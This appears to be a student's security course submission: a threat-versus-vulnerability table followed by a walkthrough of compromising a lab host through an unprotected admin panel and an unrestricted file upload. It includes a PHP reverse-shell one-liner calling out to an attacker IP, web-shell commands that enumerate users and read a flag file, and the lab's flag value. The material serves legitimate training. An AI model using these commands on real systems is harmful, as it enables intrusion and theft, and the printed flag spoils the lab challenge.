# MUHAMMAD ADAM FARHAN BIN ZAINUDDIN 52215125455 L01-B02
TASK W1 VA

Understanding the distinction between a Threat and a Vulnerability is fundamental to cybersecurity.

Vulnerability: A weakness or flaw in a system, process, or control that could be exploited.

Threat: An external or internal force/actor that has the potential to exploit a vulnerability.

## Threat vs. Vulnerability Analysis
| No | Scenario | Category | Reasoning |
|:---|:---|:---:|:---|
| 1 | An employee receives an email from "HR Department" asking to verify their login details via a link. | **Threat** | Phishing — an external malicious attempt to trick a user into revealing credentials. |
| 2 | A company server is running Windows Server 2012, which no longer receives security updates. | **Vulnerability** | Outdated/unpatched software — exploitable weakness due to lack of updates. |
| 3 | A developer accidentally uploads API keys to a public GitHub repository. | **Vulnerability** | Sensitive information exposure due to misconfiguration or human error. |
| 4 | A hacker uses a botnet to flood a website with traffic until it becomes unavailable. | **Threat** | DDoS (Distributed Denial of Service) — an active external attack. |
| 5 | The firewall in a branch office is misconfigured to allow all inbound traffic. | **Vulnerability** | Weak configuration that could be exploited. |
| 6 | An insider copies confidential customer data onto a personal USB drive. | **Threat** | Insider threat — intentional malicious activity by an authorized person. |
| 7 | The organization’s password policy allows users to set “12345” as their password. | **Vulnerability** | Weak access control due to poor policy enforcement. |
| 8 | Cybercriminals send ransomware through email attachments to multiple employees. | **Threat** | Ransomware — a direct cyberattack designed to harm and demand payment. |
| 9 | A company website doesn’t validate user input in its contact form, allowing malicious SQL commands. | **Vulnerability** | SQL Injection risk — a coding flaw in input validation. |
| 10 | Attackers use fake job advertisements on social media to trick users into sharing personal data. | **Threat** | Social engineering — psychological manipulation used to gain sensitive information. |


TASK W3 VA

## 1. Reconnaissance (Information Gathering)
**Objective:** Identify the target surface and exposed services.

The first step involves network scanning to find open ports and the software versions running on the target.

* **Nmap Scan:**
    ```bash
    nmap -sC -sV -Pn -vv 10.150.150.11
    ```
    `-sV` identifies service versions, which helps in looking up specific CVEs. `-sC` runs default scripts to check for common misconfigurations like anonymous access or exposed headers.
<img width="1267" height="654" alt="Screenshot 2026-04-14 224400" src="https://github.com/user-attachments/assets/81194b10-8f9a-47e3-a7d5-c35ebb2c4127" />
<img width="1265" height="704" alt="image" src="https://github.com/user-attachments/assets/b4834a83-2dbc-4441-8b56-ff8f4016a5f4" />
<img width="1269" height="702" alt="image" src="https://github.com/user-attachments/assets/8bf31e83-8858-4244-9907-c0026af3cc6d" />
<img width="1271" height="113" alt="image" src="https://github.com/user-attachments/assets/94a6fdb5-a2bb-4078-9abf-cd89b9ef6419" />

## 2. Scanning & Enumeration
**Objective:** Identify security flaws based on recon data.

**Web Enumeration (Gobuster):**
    ```
    gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
    ```
Since web links are often hidden, Gobuster "fuzzes" the URL to find directories. Finding `/upload` and `/admin` identified the most critical areas of the application.
<img width="1271" height="645" alt="image" src="https://github.com/user-attachments/assets/987c2ae8-9f65-47ea-8c8a-41abb3b64daa" />

### Discovered:

- `/upload`
- `/admin`

`/upload`
<img width="1270" height="365" alt="image" src="https://github.com/user-attachments/assets/f68cdf08-ceea-483f-aade-7140abf94d98" />

The exposed `/upload` directory with directory indexing enabled suggests improper access control. 
If file uploads are permitted, this could lead to arbitrary file upload, enabling an attacker to upload a malicious payload (e.g., PHP web shell) and achieve remote code execution.

`/admin`
<img width="1275" height="342" alt="image" src="https://github.com/user-attachments/assets/80544588-508b-45d3-bc93-8c140f1a3b6a" />

```latex
http://10.150.150.11/admin/addedituser.php
```
<img width="1270" height="563" alt="image" src="https://github.com/user-attachments/assets/a2b6b3e1-f02c-45b3-9434-7467ccefbd45" />

### Findings:

**Information Disclosure:** The `/upload` directory had **Directory Indexing** enabled, allowing us to see every file uploaded to the server.
**Broken Access Control:** The `/admin/addedituser.php` page was accessible without authentication. This is a "Logical Flaw" where the server fails to verify if the requester has an active admin session before granting access to sensitive functions.

## **3. Gaining Access (Exploitation)**
**Objective:** Exploit vulnerabilities to gain initial foothold.

### Vulnerability Identified:

- **Improper Access Control**
- Ability to:
    - Access admin panel
    - Create new users
    - Assign admin role (Full administrative access to web panel)

So i add **teststudent:teststudent** with **role:admin**

We can also view a list of user.
<img width="1272" height="642" alt="image" src="https://github.com/user-attachments/assets/6d7cbb8d-07d0-4ec9-aaf3-91dea07a4682" />
**Administrative Takeover:** By accessing the unprotected admin panel, a new user (`teststudent`) was created and assigned the `admin` role.

### Next Exploit: File Upload Vulnerability

- Upload functionality available
- No validation on file type

➡️ Uploaded malicious PHP file (web shell attempt)

Then i found that i can add a file. So lets try to upload the reverse shell.
```
php -r '$sock=fsockopen("192.168.252.131",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
<img width="1280" height="514" alt="image" src="https://github.com/user-attachments/assets/b9187fab-614c-492d-985c-99f0f31a0709" />
<img width="1274" height="409" alt="image" src="https://github.com/user-attachments/assets/e4299afd-b798-4de0-8ef0-d9817a4e13ab" />

Nothing happen. 
**Arbitrary File Upload:** The application allowed file uploads without validating the file extension or content type.

Lets try Command Injection via web shell

```
?cmd=whoami * `whoami`: Identifies the current user privileges.
```
<img width="1274" height="245" alt="image" src="https://github.com/user-attachments/assets/7b2f74e7-9a8f-4902-adf7-48dcb3810fa2" />
✅ Successful execution confirmed RCE

## **4. Maintaining Access (Post-Exploitation)**
**Objective:** Establish control and explore system.

```
?cmd=hostname
```
<img width="1274" height="221" alt="image" src="https://github.com/user-attachments/assets/4717774f-5182-49a3-a946-c75c818ba560" />

```
?cmd=net user
```
* `net user`: Lists users on the Windows machine.
<img width="1272" height="236" alt="image" src="https://github.com/user-attachments/assets/f95bee2d-3902-48f9-a4a0-a8bca8f3a966" />

## 5. Privilege Escalation & Lateral Movement

**Objective:** Gain higher privileges / sensitive access.

```
?cmd=dir C:\Users
```
* `dir C:\Users`: Maps out the home directories to find target data.
<img width="1276" height="387" alt="image" src="https://github.com/user-attachments/assets/6f7e00c8-2ffb-423d-8a91-444fd0fca3fc" />

```
?cmd=dir C:\Users\Administrator\
```
<img width="1282" height="476" alt="image" src="https://github.com/user-attachments/assets/696aa4c9-1d86-4a47-8d19-b5bcb891c1c9" />

```
?cmd=dir C:\Users\Administrator\Desktop
```
<img width="1277" height="277" alt="image" src="https://github.com/user-attachments/assets/44b08589-8040-411a-a9b7-912a87143319" />

THERE IT IS FLAG1!!

### Result:

- Found sensitive file:
    - `FLAG1.txt`

```
http://10.150.150.11/upload/11/cmd.php?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt
```
<img width="1275" height="229" alt="image" src="https://github.com/user-attachments/assets/62368551-41ee-4aa6-9cc8-995287ebbed1" />

> **FLAG1**: PwnTillDawnAcademyIsAwesome!!!
The combination of **Broken Access Control** (allowing admin creation) and **Unrestricted File Upload** (allowing web shell execution) led to a full system compromise.
